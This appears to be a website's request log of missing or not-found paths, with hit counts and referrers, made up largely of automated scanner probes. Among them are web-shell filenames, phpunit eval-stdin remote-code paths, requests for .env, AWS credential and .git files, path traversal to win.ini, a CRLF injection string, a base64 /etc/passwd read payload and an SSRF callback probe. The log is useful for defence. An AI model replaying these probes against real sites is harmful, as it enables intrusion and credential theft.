+/jeecg-boot/jmreport/qurestSql 2 -
+/DEMO 3 www.google.com
+/dashboard/proc.php 1 -
+/api/v1/clusters/kubeconfig/k8s 1 -
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/upload/UploadResourcePic.ashx 1 -
+/login.php 4 -
+/.well-known/pkivalidation/shell20211028.php 1 -
+/template/custom/content-editor 1 -
+/apply_sec.cgi 3 https://omega-ritual.com.ua/login_pic.asp
+/configs.php 1 -
+/wp-content/themes/statfort/include/lang_upload.php 1 -
+/atomlib.php 1 -
+/wp-content/plugins/superstorefinder-wp/css/ssf-wp-admin.css 1 -
+/wp-admin/wso112233.php 1 -
+/alfanew2.php7 1 -
+/z.php 1 -
+/public/_ignition/health-check/ 3 http://omega-ritual.com.ua/public/_ignition/health-check/
+/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ== 2 -
+/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0 2 -
+/ws_utc/resources/setting/options 1 -
+/cache-compat.php 3 -
+/forgot_password.php 2 -
+/wp-content/themes/footysquare/include/lang_upload.php 1 -
+/wp-content/plugins/contus-hd-flv-player/uploadVideo.php 4 -
+/api/login 2 https://omega-ritual.com.ua/manage/account/login
+/blog/wp-admin/install.php 2 -
+/upload 3 -
+/wp-content/plugins/livemesh-siteorigin-widgets/readme.txt 1 -
+/cms 5 -
+/tel:+380669040707 1 -
+/wp-includes/repeater.php 3 -
+/wp-content/plugins/profilegrid-user-profiles-groups-and-communities/readme.txt 1 -
+/tel:380442090261 1 -
+/wp-content/plugins/vr-calendar-sync/assets/js/public.js 1 -
+/Backup 3 www.google.com
+/wp-content/updates.php 2 www.google.com
+/wp-includes/Requests/Text/ 1 www.google.com
+/free_time.cgi 1 -
+/templates/editor-preload-container 1 -
+/apple-touch-icon-120x120.png 3 -
+/rest/domains/list 1 -
+/web_shell_cmd.gch 2 -
+/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php 1 -
+/backup 12 http://omega-ritual.com.ua/backup
+/css/votes.php 7 -
+/data/manage/cmd.php 1 -
+/api/system/deviceinfo 1 https://omega-ritual.com.ua
+/current_config/Sha1Account1 1 -
+/wp-content/themes/drode.php 1 omega-ritual.com.ua
+/wp-content/themes/rocky-theme/include/lang_upload.php 1 -
+/v1/info 1 -
+/api/experimental/patternfile 1 -
+/wp-content/themes/sketch/404.php 7 www.google.com
+/pages/createpage-entervariables.action 3 -
+/RPC2_Login 2 https://omega-ritual.com.ua
+/v1/2UL3xOgtIaWm2uRQGTDlDM4B2qt.php 1 -
+/wp-content/plugins/content-aware-sidebars/readme.txt 1 -
+/api/file 1 -
+/wp-admin/dropdown.php 8 www.google.com
+/.well-known/pki-validation/moon.php 4 www.google.com
+/tel:+380939040707 1 -
+/cong.php 2 -
+/wp-content/plugins/woocommerce-payments/dist/blocks-checkout.css 1 -
+/wordpress/wp-admin/install.php 2 -
+/wp-content/plugins/bala.php 1 -
+/wp-content/plugins/simple-file-list/ee-upload-engine.php 1 -
+/wp-content/plugins/membership-for-woocommerce/readme.txt 1 -
+/Demo 3 www.google.com
+/autoload_classmap.php 1 -
+/webadmin/clientlogin/ 1 -
+/wsoyanz.php 3 -
+/admin%20/db 2 -
+/wp-content/plugins/about.php 1 -
+/moon.php 1 -
+/test.php 1 -
+/images/icons_title.gif 2 -
+/cgi-bin/cgiServer 4 http://omega-ritual.com.ua/cgi-bin/cgiServer
+/duomiphp/ajax.php 1 -
+/admin/cms_channel.php 1 -
+/wp-p.php7 3 -
+/rwmacklg.php 1 www.google.com
+/api/v1/config/application 1 -
+/bala.php 2 -
+/wp-content/repeater.php 3 -
+/v2/query 1 -
+/wp-content/plugins/html5avmanager/lib/uploadify/uploadify.css 1 -
+/vcac/ 4 -
+/portal 5 -
+/wp-content/themes/seotheme/db.php 20 www.google.com
+/wp-content/plugins/hellopress/wp_mna.php 1 www.google.com
+/wps/PA_WCM_Authoring_UI/proxy/http/oast.me 1 http://omega-ritual.com.ua/wps/PA_WCM_Authoring_UI/proxy/http/oast.me
+/doc.php 1 -
+/bk 4 http://omega-ritual.com.ua/bk
+/tmp 5 -
+/2UL3xV5IaMT3XyjTOm3sybfR7lw.txt 1 -
+/wp-content/plugins/tatsu/changelog.md 2 -
+/wp-includes/Requests/Text/wp-login.php 4 www.google.com
+/testing 6 -
+/wp-content/themes/soundblast/include/lang_upload.php 1 -
+/.well-known/traffic-advice 38 -
+/wp-content/themes/workreap/style.css 1 -
+/wp-includes/wp-info.php 1 www.google.com
+/classsmtps.php 1 -
+/rpc.cgi 8 http://omega-ritual.com.ua/rpc.cgi
+/wp-content/uploads/siteground-optimizer-assets/pay-invoice.min.js 1 -
+/public/index.php/home/index/bind_follow/ 1 -
+/votes.php 3 -
+/about_state 1 -
+/2index.php 3 -
+/cgi-bin/ExportSettings.sh 1 -
+/pages/templates2/viewpagetemplate.action 1 -
+/setup/wizard.php 1 -
+/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/shell.php 2 www.google.com
+/wp-content/shell20211028.php 2 -
+/wordpress/xmlrpc.php 4 -
+/ui/api/v1/ui/auth/login 1 -
+/webadm/ 1 -
+/wp-content/plugins/user-registration/assets/css/user-registration.css 1 -
+/wp-content/plugins/minipiwertumin2/un.php 1 omega-ritual.com.ua
+/.well-known/acme-challenge/shell20211028.php 1 -
+/wp-content/plugins/wp-affiliate-disclosure/readme.txt 1 -
+/wp-admin/images/xmrlpc.php 3 -
+/goform/setSysAdm 1 https://omega-ritual.com.ua/login.shtml
+/img/xmrlpc.php 3 -
+/2019 3 www.google.com
+/plugins.php 1 -
+/wp-content/themes/onelife/include/lang_upload.php 1 -
+/apple-touch-icon-precomposed.png 7 -
+/wp-content/plugins/xwp/up.php 1 -
+/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php 1 http://omega-ritual.com.ua/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+/sco.php 1 omega-ritual.com.ua
+/dr/authentication/oauth2/oauth2login 1 -
+/oembed/1.0/embed 36 https://omega-ritual.com.ua/oembed/1.0/embed
+/cgi-bin/touchlist_sync.cgi 2 -
+/admin/ajax/avatar.php 1 -
+/servlet/UploadServlet 1 -
+/Public/home/js/check.js 1 -
+/service/error/sfdc_preauth.jsp 2 -
+/my1.php 1 www.google.com
+/admin/ 1 http://omega-ritual.com.ua/admin/
+/wp-content/themes/listingo/readme.txt 2 -
+/invoker/EJBInvokerServlet/ 2 -
+/ajax-api/2.0/mlflow-artifacts/artifacts 1 -
+/wp-admin/includes/moon.php 4 www.google.com
+/WordPress 3 www.google.com
+/wp-content/themes/.index.php 1 -
+/wp-content/plugins/infographic-and-list-builder-ilist/assets/js/ilist_custom_admin.js 1 -
+/application/down.php 1 -
+/test.txt 1 -
+/kjaaduee.php 1 www.google.com
+/cgi-bin/Maintain/date_config 1 -
+/ws.php7 1 -
+/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/wp-content/plugins/easy-digital-downloads/readme.txt 2 -
+/wp-includes/wp-class.php 2 -
+/WidgetHandler.ashx 1 -
+/wp-includes/wlwmanifest.xml 5 http://omega-ritual.com.ua/wp-includes/wlwmanifest.xml
+/wp-content/uploads/simple-file-list/iagggdg.php 1 -
+/wp-content/plugins/wp-autosuggest/autosuggest.php 1 -
+/wp-content/upgrade/backup.php 1 omega-ritual.com.ua
+/wp-content/plugins/wp-automatic/changelog 1 -
+/home 12 http://omega-ritual.com.ua/home
+/store 3 www.google.com
+/wp-content/plugins/charitable/assets/css/charitable-admin-menu.min.css 1 omega-ritual.com.ua
+/wd/hub 1 http://omega-ritual.com.ua/wd/hub
+/wsman 1 -
+/ws_utc/resources/setting/keystore 1 -
+/wp-content/plugins/angwp/__%20UPDATES.txt 2 -
+/wp-admin/js/image.php 1 -
+/css/ 11 https://omega-ritual.com.ua/css/index.php
+/solr/gettingstarted_shard1_replica_n1/config 1 -
+/openam/oauth2/.. 1 -
+/wp-content/plugins/mm-forms/includes/doajaxfileupload.php 1 -
+/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ== 2 -
+/texteditor.php 2 -
+/wp-include.php 2 omega-ritual.com.ua
+/.aws/credentials 1 -
+/wp-sitemap.xml 5 -
+/assets/data/usrimg/2ul3xickkev40pijv9n621poqhm.php 1 -
+/OA_HTML/BneViewerXMLService 2 -
+/OA_HTML/jsp/bsc/bscpgraph.jsp 1 -
+/wp-content/themes/wp-kobieta/404.php 1 omega-ritual.com.ua
+/as.php 1 -
+/zcwcscym.php 1 www.google.com
+/login/userverify.cgi 1 -
+/wizard/initialise.php 1 https://omega-ritual.com.ua/tos/index.php
+/wp-content/plugins/wechat-broadcast/wechat/Image.php 1 -
+/solr/admin/cores 1 -
+/ui/login.action 1 https://omega-ritual.com.ua/ui/login.action
+/lufix.php 1 -
+/boardDataWW.php 2 -
+/wp-content/plugins/easy-watermark/readme.txt 1 -
+/wp/wp-content/plugins/rsvpmaker-for-toastmasters/gutenberg/src/in.php 1 omega-ritual.com.ua
+/api/hassio_ingress/.%09./supervisor/info 1 -
+/wp-consar.php 3 -
+/phpmyadmin/ 1 -
+/wp-touch.js 8 -
+/wso.php 1 -
+/webui/file_guest 1 -
+/cgi-bin/mt/mt-xmlrpc.cgi 1 -
+/wp-content/plugins/image-hover-effects-ultimate/readme.txt 1 -
+/wp-content/uploads/wso112233.php 1 -
+/wp-includes/blocks/table/int/tmpl/ 1 www.google.com
+/.well-known/pkivalidation/bala.php 1 -
+/.env 33 -
+/SamlResponseServlet 1 -
+/view/action/download_file.php 1 -
+/moveitisapi/moveitisapi.dll 2 -
+/SWNetPerfMon.db.i18n.ashx 1 -
+/plugin/add 1 -
+/ebs.php7 1 -
+/wp-content/plugins/wp-file-manager/readme.txt 1 -
+/wp-content/plugins/super-interactive-maps/css/sim-wp-admin.css 1 -
+/.antproxy.php 1 -
+/.vscode/sftp.json 4 -
+/api/experimental/latest_runs 1 -
+/api/v1/repos/search 1 -
+/cgi-bin/logo_extra_upload.cgi 1 -
+/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt 5 www.google.com
+/server/node_upgrade_srv.js 4 -
+/scrm/crm/admin 1 -
+/index.php/management/set_timezone 1 https://omega-ritual.com.ua/index.php/management/datetime
+/.tugboat 1 -
+/session/create 1 -
+/WORDPRESS 3 www.google.com
+/install.php 1 -
+/jexws/jexws.jsp 4 -
+/%C3%83%E2%80%9A%C3%82 4 -
+/wp-content/plugins/jupiterx-core/includes/extensions/raven/assets/css/frontend.min.css 3 -
+/opensis/index.php 1 -
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile 1 -
+/wp-content/hader/seothemes/autoload_classmap.php 2 www.google.com
+/include/czey.txt 1 -
+/rrygmakj.php 1 www.google.com
+/password.jsn 1 -
+/wp-content/admin.php 1 -
+/banker/ 2 https://omega-ritual.com.ua/banker/index.php
+/wp-admin/css/colors/blue/blue.php 27 www.google.com
+/api/v4/ci/lint 1 http://omega-ritual.com.ua/api/v4/ci/lint
+/js/hrm/getdata.jsp 1 -
+/XxX.php 1 -
+/zdm/cxf/login 2 https://omega-ritual.com.ua/zdm/login_xdm_uc.jsp
+/php/ping.php 2 -
+/site 8 -
+/ccx/ 2 www.google.com
+/SDK/webLanguage 1 -
+/wp-admin/css/colors/coffee/xmrlpc.php 3 -
+/wp-content/plugins/wp-file-upload/ROOBOTS.php 1 -
+/repeater.php 8 www.google.com
+/OA_HTML/bispgraph.jsp%0D%0A.js 1 -
+/content.php 1 -
+/wp-sigunq.php 1 -
+/wp-json/am-member/license 2 -
+/BLOG 3 www.google.com
+/spip.php 2 -
+/uk/kontakti/ru 18 https://omega-ritual.com.ua/uk/kontakti/ru
+/session_login.cgi 12 http://omega-ritual.com.ua/session_login.cgi
+/vpn/../vpns/cfg/smb.conf 1 -
+/wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js 1 -
+/objects/getSpiritsFromVideo.php 1 -
+/wp-content/plugins/posts-layouts/src/ 7 https://omega-ritual.com.ua/wp-content/plugins/posts-layouts/src/index.php
+/wp-includes/wso112233.php 1 -
+/wp-content/plugins/woo-product-table/readme.txt 1 -
+/redfish/v1/SessionService/Sessions/ 2 -
+/wp-content/themes/universal-news/www.php 1 www.google.com
+/public/css/2UL3xL3XxRdR2h3sQBiVpfttBn2.css 1 -
+/wp-content/plugins/nd-donations/readme.txt 1 -
+/wp-admin/css/colors/blue/xmrlpc.php 3 -
+/backupsettings.dat 1 -
+/ae.php 1 -
+/SHOP 3 www.google.com
+/horde/admin/user.php 1 -
+/mifs/. 1 https://omega-ritual.com.ua
+/lab.html 1 -
+/wp/xmlrpc.php 4 -
+/style.php 4 www.google.com
+/console/images/%252e%252e%252fconsole.portal 1 -
+/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php 1 -
+/cms/wp-admin/install.php 2 -
+/bak.php 1 -
+/admin/dashboard.php 1 -
+/org_execl_download.action 1 -
+/bEkqndNEUu.txt 1 -
+/wp-content/plugins/core-stab/ 3 https://omega-ritual.com.ua/wp-content/plugins/core-stab/index.php
+/manager/radius/server_ping.php 2 -
+/sitemaps.xml 12 -
+/service.php 3 -
+/wp-content/plugins/seoo/wsoyanz1.php 3 -
+/wp-content/plugins/anttt/simple.php 5 www.google.com
+/2ThgbmmmtEcLydRRkmz9VKTn7Gd.txt 3 -
+/incom/modules/uploader/showcase/script.php 1 -
+/account/index.php 1 -
+/wp-content/plugins/radykal-fancy-gallery/admin/generate-code.php 1 -
+/2018 3 www.google.com
+/sitemap.txt 2 -
+/auto_seo.php 8 -
+/static/admin/javascript/hetong.js 2 https://www.omega-ritual.com.ua/static/admin/javascript/hetong.js
+/new 13 -
+/clusterList 2 -
+/wp-content/themes/spikes/include/lang_upload.php 1 -
+/wp-content/themes/ccx/ 1 www.google.com
+/webadmin/auth/verification.php 1 https://omega-ritual.com.ua/webadmin/start/
+/data/ 1 -
+/bypass.php 1 -
+/plugins/ueditor/php/controller.php 1 -
+/.well-known/acme-challenge/bala.php 1 -
+/wp-info.php 1 www.google.com
+/wp.php 1 -
+/login 2 -
+/2ThgbdTWpdEgucg1ty74aHcuMM7.jsp 1 -
+/wp-admin.php 14 -
+/wp-content/plugins/wp-live-chat-support-pro/css/wplc_styles_pro.css 1 -
+/s=set&_method=__construct&method=*&filter[]=system 1 -
+/STORE 3 www.google.com
+/servlet/~ic/bsh.servlet.BshServlet 2 -
+/web.config.i18n.ashx 1 -
+/wp-content/plugins/uploadify/readme.txt 1 -
+/plugins/content/apismtp/apismtp.php 7 -
+/account/register 1 -
+/logs/downloadMainLog 2 -
+/alfa-ioxi.php 1 -
+/wp-conflg.php 1 -
+/solr/gettingstarted_shard2_replica_n1/debug/dump 1 -
+/2015 3 www.google.com
+/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData 2 -
+/api/geojson 1 -
+/wp-content/plugins/alphabetic-pagination/readme.txt 1 -
+/wp-json/wp/v2/add-listing 1 -
+/wp-admin/js/widgets/xmrlpc.php 3 -
+/wp-content/wso112233.php 2 -
+/upgrade_handle.php 2 -
+/x 1 -
+/wp-content/plugins/n-media-woocommerce-checkout-fields/readme.txt 1 -
+/ajax/render/widget_tabbedcontainer_tab_panel 3 -
+/wp-content/plugins/td-cloud-library/assets/css/tdb_main.css 1 -
+/wp-content/themes/light-skeleton/wp-cache.php 1 omega-ritual.com.ua
+/wp-content/plugins/stopbadbots/assets/js/stopbadbots.js 1 -
+/wp-admin/css/colors/radio.php 3 -
+/api/scrape/kube-system 2 -
+/Upload/test/2ThgbYls0yl0zSpZiXKWJRXSSzO.php 1 -
+/wp-content/themes/statfort-new/include/lang_upload.php 1 -
+/wp-content/uploads/shell20211028.php 1 -
+/ws.php 1 -
+/wp-content/themes/FifteenTen/404.php 3 -
+/wp-content/plugins/nd-shortcodes/readme.txt 1 -
+/sitemap.xml.gz 4 -
+/wp-admin/wp-content/themes/FifteenTen/404.php 3 https://omega-ritual.com.ua/wp-admin//wp-content/themes/FifteenTen/404.php
+/lab/api/settings/ 2 -
+/forms/doLogin 1 -
+/.well-known/acme-challenge/wp-signup.php 1 www.google.com
+/alfacgiapi/perl.alfa 7 www.google.com
+/blog.php 1 -
+/wp-content/plugins/seotheme/mar.php 1 -
+/weaver/weaver.file.FileDownloadForOutDoc 1 -
+/ztp/cgi-bin/handler 1 -
+/fw.php 2 -
+/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php 1 -
+/Omega-Ritual 2 www.google.com
+/script/ 1 -
+/logo/2Thgbco1mbwPObsEYn6CUGeNEs2.txt 1 -
+/backup/wp-admin/install.php 2 -
+/system_log.php 7 -
+/index.php 3 -
+/backend/elfinder/elfinder-cke.html 1 -
+/setup/install.php 1 -
+/radio.php 9 -
+/wp-content/plugins/woocommerce-payments/readme.txt 3 -
+/bc 5 http://omega-ritual.com.ua/bc
+/linuxki/experimental/vis/kivis.php 1 -
+/uploads/elfinder/elfinder-cke.html 1 -
+/wp-includes/dropdown.php 1 -
+/css/xmrlpc.php 3 -
+/wp-content/plugins/wso112233.php 1 -
+/.well-known/bala.php 1 -
+/wp-content/plugins/TOPXOH/wDR.php 1 -
+/cgi-bin/logoff.cgi 1 -
+/wp-content/plugins/jobwp/readme.txt 1 -
+/cgi-bin/nightled.cgi 2 -
+/goanywhere/auth/Login.xhtml 2 -
+/_ignition/execute-solution 6 -
+/wp-content/plugins/videowhisper-live-streaming-integration/readme.txt 2 -
+/system/sharedir.php 1 -
+/phpMyAdmin/ 1 -
+/.well-known/wso112233.php 1 -
+/classes/Login.php 3 -
+/themes.php 1 -
+/test 9 -
+/login.htm 2 -
+/wp-content/plugins/mstore-api/readme.txt 4 -
+/wp-content/plugins/woo-refund-and-exchange-lite/readme.txt 2 -
+/install 2 -
+/wp-content/plugins/core-engine/admin.php 3 -
+/api/content/ 2 -
+/wp-content/upgrade/lll/3.php 3 -
+/makeasmtp.php 1 -
+/wp-content/plugins/documentor-lite/core/js/documentor.js 1 -
+/wp-content/themes/seotheme/about.php 3 -
+/wp-content/plugins/seoplugins/mar.php 1 www.google.com
+/wp-content/plugins/ht-mega-for-elementor/readme.txt 3 -
+/2UL3xWQy8tHvEAoW4mduTIVEBb4.txt 1 -
+/2016 3 www.google.com
+/wp-content/plugins/linkpreview/db.php 1 www.google.com
+/wp-admin/css/colors/xmrlpc.php 3 -
+/https:/omega-ritual.com.ua/wp-content/cache/min/1/wp-content/themes/flatsome/assets/css/fl-icons-f9232fbaadba6932e9452d24c0495af3.css 1 https://omega-ritual.com.ua/'https://omega-ritual.com.ua/wp-content/cache/min/1/wp-content/themes/flatsome/assets/css/fl-icons-f9232fbaadba6932e9452d24c0495af3.css'
+/admin/index.php 2 -
+/ora/reports/ 1 -
+/user/scripts/login_par.js 1 -
+/wp-content/themes/seotheme/mar.php 5 www.google.com
+/tel:380442092472 1 -
+/elFinder/php/connector.minimal.php 1 -
+/talari/app/files/2Thgbh2RjckNBZAD6aZ3NjArv1t 1 -
+/seeyon/thirdpartyController.do.css/.. 2 -
+/alfanew.php7 6 www.google.com
+/apisix/batch-requests 1 -
+/appGet.cgi 2 https://omega-ritual.com.ua
+/jars/upload 1 -
+/site/wp-admin/install.php 2 -
+/evcyvnhw.php 1 www.google.com
+/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/apple-touch-icon.png 8 -
+/cloud.php 1 -
+/wp-content/themes/wp-classic/inc/ 2 www.google.com
+/cgi/networkDiag.cgi 1 -
+/assets/elFinder/elfinder.html 1 -
+/glpi/scripts/unlock_tasks.php 2 -
+/jbossass/jbossass.jsp 4 -
+/process/aprocess.php 4 -
+/zimlet/com_zimbra_webex/httpPost.jsp 1 -
+/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/ca/rest/certrequests 1 -
+/wp-content/plugins/quasar-form/readme.txt 1 -
+/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/2Thgbm5A12BUtFvXe3OnwbKn1ob.txt 1 -
+/plugin/customMethod 1 -
+/objects/getImage.php 1 -
+/wp-content/plugins/rsvpmaker-for-toastmasters/gutenberg/src/in.php 1 omega-ritual.com.ua
+/snippets.inc.php 1 -
+/objects/ydcib.txt 1 -
+/2ThgbPzFFReNw7qoTP1esKulJNh.php 1 -
+/1index.php 4 www.google.com
+/q 2 -
+/downloader.php 1 -
+/STATE_ID/123/agentLogUploader 1 -
+/invoker/JMXInvokerServlet/ 2 -
+/wp-plain.php 8 www.google.com
+/csrf 1 -
+/admin/login.php 3 -
+/wp-admin/user/xmrlpc.php 3 -
+/users/user-dark-features 1 -
+/i3geo/exemplos/codemirror.php 1 -
+/BSW_cxttongr.htm 1 -
+/wp-content/plugins/final-tiles-grid-gallery-lite/readme.txt 1 -
+/wp-content/plugins/delete-duplicate-posts/readme.txt 1 -
+/oracle/reports/ 1 -
+/wp-content/themes/club-theme/include/lang_upload.php 1 -
+/author-sitemap.xml 2 -
+/wp-content/plugins/wp-pimple/click.php 1 -
+/wikindex.php 3 -
+/wp-admin/x.php 1 www.google.com
+/wp-content/plugins/wp-post-author/readme.txt 2 -
+/xxl.php 2 www.google.com
+/2UL3xUwK5DuxyMcqH4shvT46BXq.jsp 1 -
+/.well-known/admin.php 1 www.google.com
+/down_data.php 1 -
+/class.api.php 3 -
+/complete-order/ 2 -
+/st.php 1 www.google.com
+/simple.php 10 www.google.com
+/http/index.php 1 -
+/misc/ajax.js 2 -
+/wp-content/plugins/scripts-organizer/plugins/meta-box/readme.txt 1 -
+/wp-admin/includes/xmrlpc.php 3 -
+/wp-admin/ajax-actions.php 3 -
+/wp-content/plugins/foobox-image-lightbox/readme.txt 1 -
+/wp-admin/repeater.php 3 -
+/plus/ajax_street.php 3 -
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini 1 -
+/webtools/control/main 1 -
+/wp/wp-admin/install.php 2 -
+/.well-known/pkivalidation/wso112233.php 1 -
+/nagiosxi/login.php 2 -
+/api/2ThgbayvGGxO5HDC1E0gQUDdw2Z 1 -
+/run 3 -
+/wp-content/3011.php 1 -
+/uploads/assets/backend/elfinder/elfinder-cke.html 1 -
+/ebook/bookPerPub.php 1 -
+/dms/admin/accounts/payment_history.php 1 -
+/main 10 -
+/blog/wp-login.php 1 http://omega-ritual.com.ua/blog/wp-login.php
+/wp-content/plugins/ulisting/readme.txt 1 -
+/options-reading.php 8 -
+/.well-known/acme-challenge/wso112233.php 1 -
+/cgi-bin/kerbynet 3 -
+/images/xmrlpc.php 3 -
+/wp-admin/maint/maint/ajax-actions.php 3 -
+/cgi-bin/login.cgi 2 -
+/blog 9 -
+/cgi-bin/login_mgr.cgi 2 -
+/wp-content/themes/codtheme/404.php 3 omega-ritual.com.ua
+/wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js 2 -
+/2Thgbi8BsPgBnfgr6DcOHjcLKAE.txt 1 -
+/alfanew.php 4 -
+/wordpress/wp-admin/setup-config.php 1 -
+/api/components/search_projects 1 -
+/Blog 3 www.google.com
+/context.json 1 -
+/wp-content/plugins/elementor-pro/assets/css/editor.css 1 http://omega-ritual.com.ua/wp-content/plugins/elementor-pro/assets/css/editor.css
+/humans.txt 5 http://omega-ritual.com.ua/humans.txt
+/geoserver/wms 1 -
+/wp-content/themes/my-custom-theme/ 1 omega-ritual.com.ua
+/mdiy/dict/listExcludeApp 1 -
+/cgi-bin/videoconfiguration.cgi 1 -
+/auth/check 1 -
+/html/log 1 -
+/2014 3 www.google.com
+/javax.faces.resource/dynamiccontent.properties.xhtml 1 -
+/tel:+380670112160 1 -
+/wp-2019.php 1 -
+/formLoginAuth.htm 1 -
+/pma/ 1 -
+/apple-app-site-association 8 -
+/wp-content/plugins/wpcargo/includes/2UL3xToe9T74TTDs3m9FV2XwMGs.php 2 -
+/admin/suppliers/view_details.php 2 -
+/pages/createpage.action 1 -
+/demo 8 -
+/api/hassio/app/.%252e/supervisor/info 1 -
+/Admin 4 -
+/wp-content/plugins/ait-csv-import-export/changelog.txt 1 -
+/ie11CustomProperties.min.js 2 -
+/.git/config 16 -
+/seeyon/htmlofficeservlet 1 -
+/nette.micro/ 1 -
+/cgi-bin/weblogin.cgi 1 -
+/goform/setmac 1 https://omega-ritual.com.ua/index.htmlr
+/v1/agent/service/register 2 -
+/ini.php 1 -
+/eps/resourceOperations/upload.action 1 -
+/goform/downloadSyslog/syslog.log 2 -
+/premise/front/getPingData 1 -
+/wp-content/plugins/seoo/wsoyanz.php 4 www.google.com
+/new/wp-admin/install.php 2 -
+/wp-content/plugins/wp-user-avatar/changelog.txt 1 -
+/images/..%2finfo.html 1 https://omega-ritual.com.ua/info.html
+/cgi-bin/system_log.cgi 1 -
+/jasperserver-pro/reportresource/reportresource/ 1 -
+/_async/AsyncResponseService 1 -
+/api/group/list 1 -
+/rpc.php 1 -
+/wp-content/plugins/paid-memberships-pro/js/pmpro-checkout.js 2 -
+/admin.php 16 www.google.com
+/confluence/pages/createpage-entervariables.action 2 -
+/wp-content/plugins/cab-fare-calculator/tblight.php 1 -
+/wp-content/plugins/post-snippets/readme.txt 1 -
+/sftp-config.json 4 -
+/suite-auth/login 1 -
+/include/exportUser.php 2 -
+/options.php 8 -
+/2UL3xVi4jN8MQfU8Q8BuEHF4jDD.php 1 -
+/api/ping 2 -
+/wp-content/plugins/armember/documentation/index.html 1 -
+/wp-content/plugins/heroku/db.php 1 www.google.com
+/portal/info.jsp 1 -
+/zentao/user-login.html 1 https://omega-ritual.com.ua/zentao/user-login.html
+/_all_dbs 1 -
+/admin/ajax/pages.php 1 -
+/wp-content/themes/faith-theme/include/lang_upload.php 1 -
+/old 13 -
+/plugin 1 -
+/yyoa/common/js/menu/test.jsp 1 -
+/2012 3 www.google.com
+/anjas.php 1 -
+/wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt 1 -
+/assets/backend/elfinder/elfinder-cke.html 1 -
+/wiki/pages/createpage-entervariables.action 2 -
+/wp-content/plugins/popup-maker/readme.txt 1 -
+/api/get-users 1 -
+/v1/backend1 1 -
+/wp-content/themes/listingo/js/listingo_callbacks.js 1 -
+/plus/recommend.php 1 -
+/wp-static.php 3 -
+/wp-content/plugins/revslider/includes/external/page/ 5 www.google.com
+/omega-ritual 2 www.google.com
+/integration/saveGangster.action 2 -
+/wso112233.php 4 -
+/rest/v1/AccountService/Accounts 1 -
+/tmp/updateme/sinfor/ad/sys/sys_user.conf 1 -
+/wp-head.php 1 www.google.com
+/wp-includes/sodium_compat/src/Core/Curve25519/Ge/wp_blog.php 1 -
+/wp-content/themes/finley/min.php 1 www.google.com
+/wp-content/plugins/yith-woocommerce-gift-cards-premium/readme.txt 2 -
+/wp-admin/js/widgets/about.php7 3 -
+/.axiom/accounts/do.json 1 -
+/wp-content/plugins/dsp_dating/wpdating-gallery/lib/server/php/ 1 -
+/wp-content/plugins/wpcargo/includes/barcode.php 2 -
+/wp-content/plugins/forminator/assets/js/shared-ui.js 1 omega-ritual.com.ua
+/wp-content/plugins/woocommerce-upload-files/js/wcuf-admin-menu.js 2 -
+/dev 5 -
+/boaform/admin/formTracert 1 https://omega-ritual.com.ua/diag_ping_admin_en.asp
+/BACKUP 3 www.google.com
+/wp-includes/random_compat/about.php 5 -
+/console/css/%252e%252e%252fconsole.portal 1 -
+/wp-content/plugins/armember/js/arm_widgets_js.js 2 -
+/plus/ajax_officebuilding.php 1 -
+/ALFA_DATA/alfacgiapi/perl.alfa 8 www.google.com
+/wp-content/plugins/shell20211028.php 1 -
+/data:image/svg+xml,%3Csvg%20xmlns=http:/www.w3.org/2000/svg%20viewBox=0%200%20244%2090%3E%3C/svg%3E 3 -
+/admin/ajax.php 2 http://omega-ritual.com.ua/admin/ajax.php
+/ads.txt 6 http://omega-ritual.com.ua/ads.txt
+/functionRouter 1 -
+/kubepi/api/v1/systems/login/logs/search 1 -
+/getcfg.php 1 -
+/plugins/webuploader/js/webconfig.php 1 -
+/kontakty/uk 6 https://omega-ritual.com.ua/kontakty/uk
+/member/ajax_membergroup.php 1 -
+/xhkdgwop.php 1 www.google.com
+/prweb/PRAuth/app/default/ 1 http://omega-ritual.com.ua/prweb/PRAuth/app/default/
+/tool/log/c.php 4 -
+/api/config 2 -
+/ajax-actions.php 3 -
+/.well-known/acme-challenge/xmrlpc.php 4 -
+/password_change.cgi 1 https://omega-ritual.com.ua
+/tel:+380442090261 1 -
+/wp-content/inputs.php 2 www.google.com
+/pages/systemcall.php 1 -
+/.well-known/shell20211028.php 1 -
+/wp-admin/images/my1.php 1 www.google.com
+/NEW 3 www.google.com
+/ajax/api/user/save 1 -
+/userportal/Controller 1 -
+/wp-content/plugins/404-to-301/readme.txt 1 -
+/.well-known/pki-validation/xmrlpc.php 4 -
+/api/jsonws/invoke 2 https://omega-ritual.com.ua/api/jsonws
+/wp-content/plugins/wp-automatic/css/wp-automatic.css 2 -
+/bala 1 www.google.com
+/CMSInstall/install.aspx 1 -
+/public/css/2ThgbZee6y9ORtWyxl5eO9Cvipp.css 1 -
+/wp-content/plugins/forminator/readme.txt 2 -
+/actions/authenticate.php 1 -
+/.well-known/acme-challenge/my1.php 1 www.google.com
+/api/v2/cmdb/system/admin 1 -
